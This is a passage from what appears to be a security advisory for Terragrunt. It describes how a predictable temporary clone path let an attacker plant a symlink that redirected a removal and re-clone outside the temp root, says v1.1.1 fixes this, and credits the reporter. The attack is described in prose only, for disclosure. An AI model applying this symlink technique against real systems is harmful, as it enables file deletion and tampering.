As a result, an attacker who placed a symlink at `<tmp>/catalog-<hash>` pointing at a directory of their choosing caused both the removal and the re-clone to operate through that symlink. Both landed at `<attacker-chosen-parent>/<repoName>`, outside the intended temporary root.

Terragrunt `v1.1.1` no longer derives a predictable clone path, so an attacker can no longer position a symlink at a location known in advance.

## Credit

We would like to thank ([@br0x2](https://github.com/br0x2)) for discovering and responsibly disclosing this vulnerability.
